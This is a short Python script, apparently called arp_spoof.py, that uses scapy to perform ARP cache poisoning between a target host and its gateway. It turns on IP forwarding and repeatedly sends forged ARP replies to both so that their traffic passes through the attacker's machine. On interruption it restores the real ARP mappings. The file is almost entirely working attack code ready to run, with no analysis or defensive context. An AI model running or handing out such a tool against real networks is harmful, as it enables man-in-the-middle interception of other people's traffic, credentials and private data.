from scapy.all import *
import os,threading,sys,re,time

def getMAC(IP):
    a = ARP()
    a.op = 1
    a.pdst = IP
    a.hwdst = "ff:ff:ff:ff:ff:ff"

    r = sr1(a)
    r = r.hwsrc

    return r

def resetNet(target, gateway):
    # Disable IP forwarding
    os.system('sysctl -w net.ipv4.ip_forward=0')

    gwMAC = getMAC(gateway)
    tgMAC = getMAC(target)

    a = ARP()
    a.op = 2
    a.pdst = gateway
    a.hwdst = gwMAC
    a.hwsrc = tgMAC
    a.psrc = target

    b = ARP()
    b.op = 2
    b.pdst = target
    b.hwdst = tgMAC
    b.psrc = gateway
    b.hwsrc = gwMAC

    send([a,b])


def arpPoison(target, gateway):
    # Enable IP forwarding
    os.system('sysctl -w net.ipv4.ip_forward=1')
    tMAC = getMAC(target)
    gMAC = getMAC(gateway)

    # Fool gateway
    gw = ARP()
    gw.op = 2
    gw.pdst = gateway
    gw.hwdst = gMAC
    gw.psrc = target

    # Fool target
    tg = ARP()
    tg.op = 2
    tg.pdst = target
    tg.hwdst = tMAC
    tg.psrc = gateway

    try:
        while True:
            send(gw)
            send(tg)
            time.sleep(2)
    except KeyboardInterrupt:
        print 'Got ctrl-c. I am getting out of here nicely...'
        resetNet(target,gateway)




if(len(sys.argv) < 3 or len(sys.argv) > 3):
    print("Usage: sudo python ./arp_spoof.py <target ip> <gw ip>\n")
    exit(1)

gwMAC = ""
gwIP = ""
targetMAC = ""
targetIP = ""

targetIP = sys.argv[1]
gwIP = sys.argv[2]

# Make sanity check for provided IP addresses
if re.search('[a-zA-Z]+',targetIP):
    print '[ERROR]: Invalid target IP. Concern format: 192.168.1.1\n'
    exit(1)
else:
    t = targetIP.split('.')
    if (len(t) != 4):
        print '[ERROR]: Invalid target IP. Concern format: 192.168.1.1\n'
        exit(1)

if re.search('[a-zA-Z]+',gwIP):
    print '[ERROR]: Invalid gateway IP. Concern format: 192.168.1.1\n'
    exit(2)
else:
    t = gwIP.split('.')
    if(len(t) != 4):
        print '[ERROR]: Invalid gateway IP. Concern format: 192.168.1.1\n'
        exit(2)

gwMAC = getMAC(gwIP)
targetMAC = getMAC(targetIP)

try:
    arpPoison(targetIP,gwIP)
except KeyboardInterrupt:
    print 'Got cltr-c'
    resetNet(targetIP,gwIP)
